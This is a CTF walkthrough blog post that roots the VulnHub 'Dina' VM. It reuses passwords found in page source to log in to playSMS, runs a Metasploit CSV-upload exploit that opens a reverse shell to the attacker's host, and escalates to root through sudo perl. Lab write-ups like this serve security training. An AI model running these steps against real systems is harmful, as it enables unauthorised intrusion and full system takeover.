<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Dina VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-dina-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2017-11-05T17:15:42+00:00">November 5, 2017</time><time class="updated" datetime="2025-06-10T20:29:59+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to take another CTF challenge, Dina. The credit for making this VM machine goes to “Touhid Shaikh” and it is a boot2root challenge where we have to root the server and capture the flag to complete the challenge. You can download this VM <strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/dina-101,200/">here</a></strong>.</span></p>
<p><span style="color: #000000;"><strong>Security Level</strong>: Beginner</span></p>
<h3><span style="color: #993300;"><strong>Penetrating Methodology:</strong></span></h3>
<ol>
<li><span style="color: #000000;"><strong>Scanning</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">NMAP</span></li>
</ul>
<ol start="2">
<li><span style="color: #000000;"><strong>Enumeration</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;">NMAP</span></li>
<li><span style="color: #000000;">Web Directory Search </span></li>
</ul>
<ol start="3">
<li><span style="color: #000000;"><strong>Exploitation</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;">Metasploit</span></li>
</ul>
<ol start="4">
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;">Exploiting Sudo rights</span></li>
</ul>
<h3><span style="color: #993300;">Walkthrough:</span></h3>
<h3><span style="color: #993300;"><strong>Scanning:</strong></span></h3>
<p><span style="color: #000000;">Let’s start off by scanning the network and identifying the host IP address. We can identify our host IP as 192.168.43.219 by using Netdiscover.</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-F2B1aQqlrj0/XTXXW30bD6I/AAAAAAAAfbk/4Ch3b8Y1xic43YxlqN9eABOGRG-FK4QxQCLcBGAs/s1600/1.png"/></p>
<p><span style="color: #000000;">Then, as usual, we used our favourite tool Nmap for port enumeration. We found that port 80 is open.</span></p>
<pre class="lang:default decode:true ">nmap –A 192.168.43.219</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Ns37wnw_okI/XTXXY683RJI/AAAAAAAAfb8/l39JPK04o90wXbjM6vK5QlNL8RsI3JDEwCLcBGAs/s1600/2.png"/></p>
<h3><span style="color: #993300;"><strong>Enumeration:</strong></span></h3>
<p><span style="color: #000000;">As we can see port 80 is open, we tried to open the IP address in our browser but we didn’t find anything useful on the webpage.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Ad76YBNsXLY/XTXXZEv5RYI/AAAAAAAAfcA/AMHSaZ4GMiYDbHzU_GV9GAhAR7-v21r8ACLcBGAs/s1600/3.png"/></p>
<p><span style="color: #000000;">Also in the nmap scan, we found the<strong> robots.txt </strong>directory, so we tried to open it in the browser.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/--KBQ5IrOxGE/XTXXZdCkvBI/AAAAAAAAfcE/ZtxKnwdIqQsDUvOO2UkaWxvUvEPkfiEGACLcBGAs/s1600/4.png"/></p>
<p><span style="color: #000000;">Inside the robots.txt directory, we found the names of multiple directories, so we tried to open each one of them one by one but found <strong>/nothing </strong>directory useful to us.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-ENMc0u6B6O8/XTXXZwOTl9I/AAAAAAAAfcI/xfNVrPtPi18cEeKVGJcEgztbVu9DemW5ACLcBGAs/s1600/5.png"/></p>
<p><span style="color: #000000;">The source code of <strong>/nothing </strong>directory revealed some passwords which were useful later.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-_bdK0s97i1E/XTXXZ8kDI7I/AAAAAAAAfcM/uIQ0VMAubJoatWNiVprS2dfYw-da_k13gCLcBGAs/s1600/6.png"/></p>
<p><span style="color: #000000;">We have got the passwords so we used <strong>dirb </strong>to find out any further directories where we could use these passwords. We found a directory named <strong>/secure</strong>.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.43.219</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-PBTnBAFoaWc/XTXXaSdQneI/AAAAAAAAfcQ/HvXUvoYroboWSKfiL1FbjgF0PGdI03OKgCLcBGAs/s1600/7.png"/></p>
<p><span style="color: #000000;">In the <strong>/secure</strong> directory there is a zip file named <strong>backup.zip. </strong>We download the file in our kali machine.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-3wP4toGkLKQ/XTXXal76k-I/AAAAAAAAfcU/tBr_KBgEETos8NSdYu6xnv18kGcJOs61QCLcBGAs/s1600/8.png"/></p>
<p><span style="color: #000000;">When we tried to extract the zip file it was password-protected, so we tried all the passwords found above and <strong><em>freedom</em> </strong>was the correct one.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-54BYtDltE_A/XTXXa9V_ocI/AAAAAAAAfcY/009Gf681FqwVOYSVAZKecsBjI7YNW2S8gCLcBGAs/s1600/9.png"/></p>
<p><span style="color: #000000;">Now after we extract the file we find an mp3 file. We checked the file type and found out it is actually an ASCII file. We opened it and got a username <strong>touhid</strong> and a name of directory <strong>/SecreTgatwayLogin.</strong></span></p>
<pre class="lang:default decode:true">file backup-cred.mp3
cat backup-cred.mp3</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-sGktj5ICOB8/XTXXW50FR1I/AAAAAAAAfbg/3gsAxtAPWOMbYy6YToHYypDk1K3BzWVfgCLcBGAs/s1600/10.png"/></p>
<p><span style="color: #000000;">We opened the directory in the browser and got a <strong>playSMS </strong>login page. We put in the username <strong>touhid </strong>and tried the password from the above-found list and <strong><em>diana </em></strong>worked for us.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-zIi2sxjFafA/XTXXXGeHxHI/AAAAAAAAfbo/75zdAAYRmbo13l3GvHeKASfG1gHFTK1jQCLcBGAs/s1600/11.png"/></p>
<h3><span style="color: #993300;"><strong>Exploitation:</strong></span></h3>
<p><span style="color: #000000;">In the exploitation phase, we looked for any exploit of <strong>playSMS </strong>web-application in the Metasploit and found two exploits.</span></p>
<pre class="lang:default decode:true">search playsms</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-YQH505jT1gs/XTXXXpg630I/AAAAAAAAfbs/4ENmue2q4pgsBzWMWEKvaOODDJjUzca2gCLcBGAs/s1600/12.png"/></p>
<p><span style="color: #000000;">We used the second exploit in which we are uploading our payload using a<strong> CSV </strong>file.</span></p>
<p><span style="color: #000000;">We put in the required fields and used touhid and diana as username and password.</span></p>
<pre class="lang:default decode:true ">use exploit/multi/http/playsms_uploadcsv_exec
set rhost 192.168.43.219
set lhost 192.168.43.171
set lport 4444
set username touhid
set password Diana
set targeturi /SecreTgatwayLogin
exploit</pre>
<p><strong style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PCJGNuFgDos/XTXXYIqjNpI/AAAAAAAAfbw/TOr1JyA0E24qRWoUO0QHLWD8lhlfebvUwCLcBGAs/s1600/13.png"/></strong></p>
<p><span style="color: #000000;">After running the exploit, we successfully got a metrepreter session and the used python one-liner to get a proper shell.</span></p>
<p><span style="color: #000000;">On checking the <strong>sudo </strong>permissions for the <strong>www-data </strong>user, it had a sudo permission to run <strong>perl.</strong></span></p>
<pre class="lang:default decode:true">getuid
shell
python -c 'import pty; pty.spawn("/bin/sh")'
sudo -l</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-IZ0O_Sm142k/XTXXYA2mfFI/AAAAAAAAfb0/yitUdDDmgQQb_QPejXj95SoJO2EPLtckACLcBGAs/s1600/14.png"/></p>
<h3><span style="color: #993300;"><strong>Privilege Escalation:</strong></span></h3>
<p><span style="color: #000000;">To elevate to root privileges we exploited the sudo permissions of perl and successfully got the <strong>root shell. </strong>And then traversed to the root directory and found the <strong>flag.txt </strong>file.</span></p>
<pre class="lang:default decode:true">sudo /usr/bin/perl –e "exec '/bin/sh'"
whoami
cd /root
ls
cat flag.txt</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-08_4XfLysxQ/XTXXYaj773I/AAAAAAAAfb4/oywxLbcNgug1K0mM-5n0tAicbN7vXew_ACLcBGAs/s1600/15.png"/></p>
<p><span style="color: #000000;"><strong>Author</strong>: Auqib Wani is a Certified Ethical Hacker, Penetration Tester and a Tech Enthusiast with more than 5 years of experience in the field of Network &amp; Cyber Security. Contact</span> <strong><a href="https://www.linkedin.com/in/auqib-wani-14210a71/">Here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
